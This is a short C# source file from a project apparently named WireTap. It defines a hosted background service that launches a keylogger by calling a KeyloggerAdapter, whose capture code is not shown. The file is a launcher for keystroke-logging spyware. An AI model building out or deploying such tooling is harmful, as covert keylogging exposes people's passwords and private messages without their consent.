namespace WireTap.HostedService
{
    using System;
    using System.Threading;
    using System.Threading.Tasks;
    using global::WireTap.Adapter;
    using Microsoft.Extensions.Hosting;

    internal class KeyloggerService : ServiceBase, IHostedService
    {
        protected override async Task InternalExecuteAsync(CancellationToken cancellationToken)
        {
            Console.WriteLine("Execuing KeyloggerService InternalExecuteAsync");
            var adapter = new KeyloggerAdapter();
            adapter.Execute();
        }
    }
}